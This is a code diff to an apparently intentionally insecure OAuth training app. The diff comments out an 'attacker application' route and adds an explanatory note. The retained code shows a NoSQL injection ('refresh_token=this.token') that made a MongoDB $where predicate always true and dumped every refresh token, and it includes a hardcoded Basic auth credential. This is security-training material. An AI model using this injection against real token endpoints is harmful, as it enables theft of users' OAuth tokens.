@@ -188,29 +188,37 @@ app.post('/exchangewithothercreds', async function(req, res){
   }
 });
 
-app.get('/hashtokens', async function(req, res){
-  options = {
-    'method':'post',
-    'headers':{
-      'content-type': 'application/x-www-form-urlencoded',
-      'Authorization': 'Basic cGhvdG9wcmludDpzZWNyZXQ=',
-    },
-    'url':gallery.oauth.auth.tokenHost + gallery.oauth.auth.tokenPath, 
-    'body':'grant_type=refresh_token&refresh_token=this.token'
-  };
-  try {
-    response = await makeRequest(options);
-    var obj = JSON.parse(response);
-    var tokensstr = obj.description.replace('You consumed the following refresh token: ','');
-    var tokens = JSON.parse(tokensstr);
-    console.log(tokens);
-    res.render('hashtokens', {tokens:tokens});
-
-  }catch (error) {
-    console.error(error);
-    res.status(500).render('error');
-  }
-});
+// /hashtokens demonstrated a NoSQL injection against gallery's Mongo
+// $where clause (refresh_token=this.token made the predicate always-true
+// and dumped every refresh token). gallery has since moved to SQLite (see
+// insecureapplication-go/z-ai/gallery-sqlite-plan.md), which has no
+// equivalent to $where's arbitrary-server-side-JS predicate, so this no
+// longer applies -- left commented out rather than deleted, as a record of
+// what used to be exploitable here.
+//
+// app.get('/hashtokens', async function(req, res){
+//   options = {
+//     'method':'post',
+//     'headers':{
+//       'content-type': 'application/x-www-form-urlencoded',
+//       'Authorization': 'Basic cGhvdG9wcmludDpzZWNyZXQ=',
+//     },
+//     'url':gallery.oauth.auth.tokenHost + gallery.oauth.auth.tokenPath,
+//     'body':'grant_type=refresh_token&refresh_token=this.token'
+//   };
+//   try {
+//     response = await makeRequest(options);
+//     var obj = JSON.parse(response);
+//     var tokensstr = obj.description.replace('You consumed the following refresh token: ','');
+//     var tokens = JSON.parse(tokensstr);
+//     console.log(tokens);
+//     res.render('hashtokens', {tokens:tokens});
+//
+//   }catch (error) {
+//     console.error(error);
+//     res.status(500).render('error');
+//   }
+// });
 
 app.listen(1337, function () {
   console.log('Attacker Application listening on '+this.address().address +':'+this.address().port);
